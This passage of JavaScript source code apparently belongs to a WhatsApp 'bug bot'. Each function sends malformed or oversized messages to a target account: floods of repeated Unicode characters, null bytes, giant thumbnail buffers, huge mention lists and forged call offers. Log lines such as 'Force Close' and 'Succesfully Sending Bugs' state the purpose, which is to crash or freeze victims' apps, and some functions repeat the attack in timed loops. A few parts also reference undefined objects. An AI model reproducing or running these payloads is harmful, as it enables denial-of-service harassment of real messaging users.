                                title: "‼️⃟ ༚ ./𝐃𝐚𝐫𝐤-𝐀𝐢.𝐯𝐯𝐢𝐩",
                                body: trigger,
                                mediaType: 1,
                                renderLargerThumbnail: true,
                                showAdAttribution: false
                            }
                        },
                        body: { text: trigger },
                        nativeFlowMessage: { 
                            messageParamsJson: "{".repeat(10000) 
                        }
                    }
                }
            }
        };

        await sock.relayMessage(target, msg, { 
            participant: { jid: target }, 
            messageId: sock.generateMessageTag() 
        });
        logger.info(`[🚀] Force Close dikirim ke ${target}`);
    } catch (err) {
        logger.error(`[❌] Gagal kirim Force Close: ${err.message}`);
    }
}

async function blank5msg(sock, target) {
  const Msg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "BANG BANG"
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(150000),
                  phone_number: "00000000000000"
                })
              }
            ],
            version: 3
          }
        }
      }
    }
  };
  await sock.relayMessage(target, Msg, {
    participant: { jid: target }
  });
}

async function FreezeChatByMia(sock, target) {
  await sock.relayMessage(target, {
     interactiveResponseMessage: {
        body: {
          text: "Miaa",
          format: 1
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: `{\"wa_flow_response_params\":{\"title\":${"𑇂𑆵𑆴𑆿".repeat(60000)}}}`,
          version: 3,
        }
     }
  }, { participant: { jid: target } });
}

async function GroupCrashUi(sock, target) {
  try {
    const jid = target.includes("@g.us")
      ? target
      : target.replace(/@.+$/, "@g.us");

    const extendedTextMsg = {
      extendedTextMessage: {
        text: "LexzyIsHere!!",
        contextInfo: {
          mentionedJid: ["13135550002@s.whatsapp.net"],
          externalAdReply: {
            title: "LexzyModss",
            body: "Test message",
            thumbnailUrl: "https://github.com/LexzyModss/",
            sourceUrl: "https://github.com/LexzyModss/",
            mediaType: 1
          }
        }
      }
    };

    await sock.relayMessage(jid, extendedTextMsg, {
      participant: jid
    });

  } catch (err) {
    console.error("Error GroupCrashUi:", err);
  }
}

async function permenCall(sock, toJid, isVideo = true) {
  // jidEncode dan encodeSignedDeviceIdentity sudah diimport di atas
  const callId = crypto.randomBytes(16).toString('hex').toUpperCase().substring(0, 64);
  const encKey = crypto.randomBytes(32);
  
  // Pastikan getUSyncDevices tersedia
  if (!sock.getUSyncDevices) return { error: "Socket tidak mendukung USync" };

  try {
      const devices = (await sock.getUSyncDevices([toJid], true, false))
        .map(({ user, device }) => jidEncode(user, 's.whatsapp.net', device));

      await sock.assertSessions(devices, true);

      const { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(devices, {
        call: { callKey: new Uint8Array(encKey) }
      }, { count: '2' });

      const offerContent = [
        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
        {
          tag: "video",
          attrs: {
            orientation: "0",
            screen_width: "1920",
            screen_height: "1080",
            device_orientation: "0",
            enc: "vp8",
            dec: "vp8"
          }
        },
        { tag: "net", attrs: { medium: "3" } },
        { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
        { tag: "encopt", attrs: { keygen: "2" } },
        { tag: "destination", attrs: {}, content: destinations },
        ...(shouldIncludeDeviceIdentity ? [{
          tag: "device-identity",
          attrs: {},
          content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
        }] : [])
      ].filter(Boolean);

      const stanza = {
        tag: 'call',
        attrs: {
          id: sock.generateMessageTag(),
          from: sock.user.id,
          to: toJid
        },
        content: [{
          tag: 'offer',
          attrs: {
            'call-id': callId,
            'call-creator': sock.user.id
          },
          content: offerContent
        }]
      };

      await sock.query(stanza);
      return { id: callId, to: toJid };
  } catch (err) {
      logger.error("❌ Error permenCall:", err.message);
      return { error: err.message };
  }
}

async function StickerFC(sock, target){
  const message = {
  "groupStatusMessageV2": {
    "message": {
      "stickerMessage": {
        "url": "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
        "fileSha256": "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
        "fileEncSha256": "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
        "mediaKey": "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
        "mimetype": "image/webp",
        "directPath": "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
        "fileLength": "10610",
        "mediaKeyTimestamp": "1775044724",
        "stickerSentTs": "1775044724091"
      }
    }
  }
}

  return await sock.relayMessage(target, message, {})
}

async function pay(sock, target) {
  try {
    await sock.relayMessage(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              hasMediaAttachment: false,
            },
            body: {
              text: 'cv by nor',
            },
            footer: {
              footerText: '\u0000'.repeat(1000),
            },
            nativeFlowMessage: {
              buttons: [
  { 
name: "single_select",
buttonParamsJson: JSON.stringify({
title: "\u0000".repeat(10000),
sections: [{ title: "", rows: [] }]
})
},
{
name: "quick_reply",
 buttonParamsJson: JSON.stringify({
 display_text: "𑜦𑜠".repeat(10000),
 id: null
 })
}, 
  {
    name: 'galaxy_message',
    buttonParamsJson: JSON.stringify({}),
  },
  {
        name: "group_invite",
        buttonParamsJson: JSON.stringify({
            group_jid: null,
            invite_code: `p${Math.random().toString().slice(2, 64)}`,
            display_text: "ꦽ".repeat(10000), 
        })
    },
    {
        name: "video_call",
        buttonParamsJson: JSON.stringify({
            display_text: "ꦽ".repeat(10000), 
        })
    },
    {
        name: "live_location",
        buttonParamsJson: JSON.stringify({
            display_text: "ꦽ".repeat(10000),
        })
    },
  {
    name: 'review_and_pay',
    buttonParamsJson: JSON.stringify({
      currency: "1",
      total_amount: { value: Date.now() + 999999, offset: 99999 },
      type: 2,
      transaction_id: null,
    }),
  },
], 
              messageParamsJson: "}".repeat(5000), 
            },
            contextInfo: {
              stanzaId: null,
              remoteJid: 'status@broadcast',
              isForwarded: true,
              forwardingScore: 9799,
              mentionedJid: [
                ...Array.from({ length: 1900 }, (_, p) => `86705131476${p}@bot`),
                target,
                '0@s.whatsapp.net',
              ],
              quotedMessage: {
paymentInviteMessage: {
serviceType: 3,
expiryTimestamp: Date.now() + 710899
}
}, 
            },
          },
        },
      },
    }, {
      messageId: null,
      participant: { jid: target },
    });
    console.log('done');
  } catch (e) {
    console.log('error:', e.message);
  }
}

async function fcAjaSih(sock, target) {
    const overflow = "A".repeat(90000);
    
    for (let i = 0; i < 3; i++) {
        await sock.sendMessage(target, {
            text: overflow,
            contextInfo: {
                mentionedJid: [target],
                stanzaId: overflow,
                participant: target,
                quotedMessage: {
                    callLogMessage: {
                        callId: overflow,
                        callDuration: -9999999999999,
                        callType: overflow,
                        callParticipants: Array(3000).fill({
                            jid: overflow + "@s.whatsapp.net",
                            callDuration: -9999999999999
                        })
                    }
                }
            }
        });
        
        await new Promise(r => setTimeout(r, 200));
    }
    
    await sock.sendMessage(target, { text: "GOOD BYE" });
    
    return { status: "SENT", target: target };
}

async function NanasTerbitForce(sock, target) {
await nted.relayMessage(target, {
 callLogMesssage: { 
  isVideo: true, 
  callOutcome: "REJECTED", 
  durationSecs: "3", 
  callType: "VOICE_CHAT", 
   participants: [
    { 
      jid: target, 
      callOutcome: "CONNECTED" 
    },
    { 
      jid: "0@s.whatsapp.net", 
      callOutcome: "CONNECTED" 
    }
  ]}
 }, {})
}

async function NeoLritzy(sock, target) {

  const uni = "ꦾ".repeat(30000)  
  
  const NeoGrup = await Promise.all(
    Array.from({ length: 3 }, (_, i) =>
      generateWAMessageFromContent(
        target,
        {
          groupInviteMessage: {
            groupJid: `1234567890-12345${i}@g.us`,
            inviteCode: "NeO" + i,
            inviteExpiration: null,
            groupName: "Maklu Busuk" + (i + 1) + " " + uni,
            caption: "YUK-O ARE HERE" + (i + 1) + " " + uni,
            jpegThumbnail: null
          }
        },
        {}
      )
    )
  )

  const NeoCh = await Promise.all(
    Array.from({ length: 2 }, (_, i) =>
      generateWAMessageFromContent(
        target,
        {
          newsletterAdminInviteMessage: {
            newsletterJid: "120363424081787233@newsletter",
            newsletterName: "𝘠𝘶𝘬𝘰 - 𝘈𝘱𝘱𝘉𝘶𝘨" + (i + 1) + " " + uni,
            caption: "𝘠𝘶𝘬𝘰" + (i + 1) + " " + uni,
            inviteExpiration: null
          }
        },
        {}
      )
    )
  )

  for (const m of [...NeoGrup, ...NeoCh]) {
    await sock.relayMessage(
      target,
      m.message,
      { messageId: m.key.id }
    )
  }
}
async function NanasCrashIos(sock, target) {
  const ilegalNas = Date.now();
  const Ilegal = 5 * 60 * 2000; 
  const Makklo = 5 * 1000; 
  try {
    while (Date.now() - ilegalNas < Ilegal) {
      const timeElapsed = Date.now() - ilegalNas;
      const timeLeft = Ilegal - timeElapsed;
      const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
          message: {
            locationMessage: {
              degreesLatitude: -66.666,
              degreesLongtitude: 66.666,
              name: "\u0000" + "饝噦饝喌饝喆饝喛饝喛".repeat(9999),
              address: "\u0000" + "饝噦饝喌饝喆饝喛饝喛".repeat(9999),
              jpegThumbnail: null,
              url: `https://t.me/${"饝噦饝喌饝喆饝喛".repeat(15000)}`,
              contextInfo: {
                participant: target,
                forwardingScore: 1,
                isForwarded: true,
                stanzaId: target,
                mentionedJid: [target]
              },
            },
          },
        },
      }, {});
      if (timeLeft > Makklo) {
        await sock.relayMessage(target, {
          requestPhoneNumberMessage: {
            contextInfo: {
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/pdf",
                  fileSha256: "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=",
                  fileLength: 0,
                  pageCount: 0,
                  mediaKey: "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=",
                  fileName: "NanasIos.pdf",
                  fileEncSha256: "R33GE5FZJfMXeV757T2tmuU0kIdtqjXBIFOi97Ahafc=",
                  directPath: "/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0",
                  mediaKeyTimestamp: 1737369406,
                  caption: "LexzyMods - Executed驴!",
                  title: "LezzyMods - Executed驴!",
                  mentionedJid: [target],
                }
              },
              externalAdReply: {
                title: "LexzyMods - Executed驴!",
                body: "饝噦饝喌饝喆饝喛".repeat(30000),
                mediaType: "VIDEO",
                renderLargerThumbnail: false,
                sourceUrl: "https://t.me/LexzyMods",
                mediaUrl: "https://t.me/LexzyMods",
                containsAutoReply: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example"
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "1@newsletter",
                serverMessageId: 1,
                newsletterName: "饝噦饝喌饝喆饝喛".repeat(30000),
                contentType: "UPDATE",
              },
            },
            skipType: 7,
          }
        }, { participant: { jid: target } });
      }
      await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
          tag: "meta", attrs: {}, content: [{
            tag: "mentioned_users", attrs: {}, content: [{
              tag: "to", attrs: { jid: target }, content: undefined
            }],
          }],
        }],
      });
      if (timeLeft <= Makklo) break;
      await new Promise(resolve => setTimeout(resolve, 2000));
    }
  } catch (error) {
    console.log(error);
  }
}
async function FcClickByMia(sock, target) {
  await sock.relayMessage(target, {
    "videoMessage": {
      "url": "https://mmg.whatsapp.net/v/t62.7161-24/30566750_1857105954891876_3816939022397797459_n.enc?ccb=11-4&oh=01_Q5Aa3QGVqUxB57u6_E2roaz94BnhKVu1X2gLsihMwET-vUIkLQ&oe=6960787D&_nc_sid=5e03e0&mms3=true",
      "mimetype": "video/mp4",
      "fileSha256": "Vbqeh2lor8Jw03cFXxKlG0Z8ov9a8WOEkviuZSVSn6A=",
      "fileLength": "175891",
      "seconds": 1,
      "mediaKey": "W430WGQWHdPJavPx++FhjoimbRmgn4juKdt9R6yBKOM=",
      "height": 848,
      "width": 480,
      "fileEncSha256": "9QJErKyUw6Um/LC9shgLoZmN0UDoX8DJPob/G0oXi48=",
      "directPath": "/v/t62.7161-24/30566750_1857105954891876_3816939022397797459_n.enc?ccb=11-4&oh=01_Q5Aa3QGVqUxB57u6_E2roaz94BnhKVu1X2gLsihMwET-vUIkLQ&oe=6960787D&_nc_sid=5e03e0&_nc_hot=1765345956",
      "mediaKeyTimestamp": "1765345955",
      "streamingSidecar": "As5LhkSwskInV2ZBolPQK8kUK/FS8OjeKC4E/DSY",
      "annotations": [{
        "shouldSkipConfirmation": true,
        "embeddedContent": {
          "embeddedMusic": {
            "musicContentMediaId": "3312808138872179",
            "songId": "270259430421407",
            "author": "ြ".repeat(200000),

            "title": "# - D‌o‌ Y‌o‌u‌ K‌n‌o‌w‌ M‌i‌a‌?‌ Y‌e‌a‌h‌ I‌a‌m‌ M‌i‌a‌ 🤪",
            "artworkDirectPath": "/v/t62.76458-24/595759391_863062182901487_831028644482797415_n.enc?ccb=11-4&oh=01_Q5Aa3QFi_Lrr3pnfhgCNgS6DwjBC9W1jxZqyMu9YTA3qbjUHrg&oe=69606F3E&_nc_sid=5e03e0",
            "artworkSha256": "Rm0L8d3YCRSi2JNPUdFEM3n1eABvF1mdvE0DWnPSzyQ=",
            "artworkEncSha256": "Q6uE0wu/wQ4goKG+OHQkTvSJ2dcSzALDzZ322g9xdfQ=",
            "artistAttribution": "https://www.instagram.com/_u/carlos_10474",
            "countryBlocklist": "",
            "isExplicit": true,
            "artworkMediaKey": "1hxqLYZLT2dZnJayfE4KP/9wh+kSbBVBkvvguo+N8m8=",
            "musicSongStartTimeInMs": "10149",
            "derivedContentStartTimeInMs": "0",
            "overlapDurationInMs": "1000"
          }
        },
        "embeddedAction": true
      }]
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: Math.floor(Math.random() * 99999999),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
  });
}
async function FreezeByMia(sock, target) {
  const miaMsg = {
    message: {
      groupStatusMessageV2: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "01@newsletter",
            newsletterName: "ោ៝".repeat(30000),
            inviteCode: "miacntik",
            inviteExpiration: 999999999999999,
            inviteText: "queenmia",
            directAdd: true,
            contextInfo: {
              externalAdReply: {
                title: "MiaOfc",
                body: "GuaMiaJie🤭",
                mediaType: 1,
                thumbnail: Buffer.alloc(157286400, 0xFF),
                mediaUrl: "https://files.catbox.moe/b6zhmm.jpg",
                sourceUrl: "https://" + "x".repeat(10000) + ".com"
              },
              forwardingScore: 999999999,
              isForwarded: true,
              quotedMessage: {
                newsletterAdminInviteMessage: {
                  newsletterJid: "01@newsletter",
                  newsletterName: "ꦾ".repeat(20000),
                  inviteCode: "Mia",
                  inviteText: "Cntik",
                  contextInfo: {
                    externalAdReply: {
                      title: "\n".repeat(23000),
                      body: "⚘  GwMiaJie🤤—",
                      mediaType: 1,
                      thumbnail: Buffer.alloc(104857600, 0xFF)
                    },
                    mentionedJid: [target]
                  }
                }
              },
              mentionedJid: [target],
              expiration: 999999999,
              ephemeralSettingTimestamp: 999999999,
              stanzaId: "queenmia",
              urlTrackingMap: {
                urlTrackingMapElements: Array.from({ length: 500000 }, (_, z) => ({
                  participant: `62${z + 720599}@s.whatsapp.net`
                }))
              }
            }
          }
        }
      }
    }
  };
  
  await sock.relayMessage("status@broadcast", miaMsg, {
    messageId: null,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  });
  console.log("🕊 Succesfully Sending Bugs");
}
async function BarzzTamvan(sock, target) {
  try {
    await sock.relayMessage(target, {
        extendedTextMessage: {
          text: "# - D̶o̶ Y̶o̶u̶ K̶n̶o̶w̶ M̶i̶a̶?̶ Y̶e̶a̶h̶ I̶a̶m̶ M̶i̶a̶ 🤪\n" + "ꦽ".repeat(50000),

          previewType: "NONE",

          contextInfo: {
            mentionedJid: [
              "6287898053857@s.whatsapp.net"
            ],

            forwardingScore: 1,
            isForwarded: true,

            externalAdReply: {
              title: "Mia Official",
              body: "Olaa Ini Mia",
              thumbnailUrl: "https://files.catbox.moe/o36gja.jpg",
              sourceUrl: "https://t.me/AngelOfDarkNexx",
              mediaType: 1,
              renderLargerThumbnail: true,
              showAdAttribution: false
            },

            inviteLinkGroupTypeV2: "DEFAULT"
          }
        }
      },
      {}
    );

    console.log(` Succes Sending Bug To ${target}`);

  } catch (error) {
    console.log("Error Bitch\n" + error);
  }
}
async function ForcloseIos(target, mention) {
console.log(chalk.red(`Succesfully Send ${target}`))
const TravaIphone = ". 覊覉鈨濃優鈨熲儬鈨り櫚隀碴櫛鈥贬渾幄�" + "饝噦饝喌饝喆饝喛".repeat(60000); // Trigger1
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "饝噦饝喌饝喆饝喛饝喛".repeat(15000), // Trigger2
         address: "\u0000" + "饝噦饝喌饝喆饝喛饝喛".repeat(10000), // Trigger 3
         url: `https://st-gacor.${"饝噦饝喌饝喆饝喛".repeat(25000)}.com`, //Trigger 4
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "# - D潭o潭 Y潭o潭u潭 K潭n潭o潭w潭 M潭i潭a潭?潭 Y潭e潭a潭h潭 I潭a潭m潭 M潭i潭a潭 馃お" + TravaIphone, //Trigger 5
            matchedText: "# - D潭o潭 Y潭o潭u潭 K潭n潭o潭w潭 M潭i潭a潭?潭 Y潭e潭a潭h潭 I潭a潭m潭 M潭i潭a潭 馃お",
            description: "饝噦饝喌饝喆饝喛".repeat(25000),//Trigger 6
            title: "# - D潭o潭 Y潭o潭u潭 K潭n潭o潭w潭 M潭i潭a潭?潭 Y潭e潭a潭h潭 I潭a潭m潭 M潭i潭a潭 馃お" + "饝噦饝喌饝喆饝喛".repeat(15000),//Trigger 7
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      await mia.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await mia.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target 
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await mia.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target 
                  },
                  content: undefined
               }]
            }]
         }]
      });
   } catch (err) {
      console.error(err);
   }
};
async function dingleybymia(sock, target) {
const startTime = Date.now();
  const duration = 1 * 60 * 1000;
  while (Date.now() - startTime < duration) {
    await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
      interactiveResponseMessage: {
        body: {
          text: "# - D̶o̶ Y̶o̶u̶ K̶n̶o̶w̶ M̶i̶a̶?̶ Y̶e̶a̶h̶ I̶a̶m̶ M̶i̶a̶ 🤪",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: "",
          version: 3
        },
        nativeFlowResponseMessage: {
          name: "flow_message",
          paramsJson: "",
          version: 3
        },
        contextInfo: {
          remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
          isForwarded: true,
          forwardingScore: 9999,
          urlTrackingMap: {
            urlTrackingMapElements: Array.from({ length: 209000 }, (_, z) => ({
              participant: `62${z + 720599}@s.whatsapp.net`
            }))
          },
        },
      },
    },
  },
 }, { participant: { jid: target }});
}
}
// ==========================================
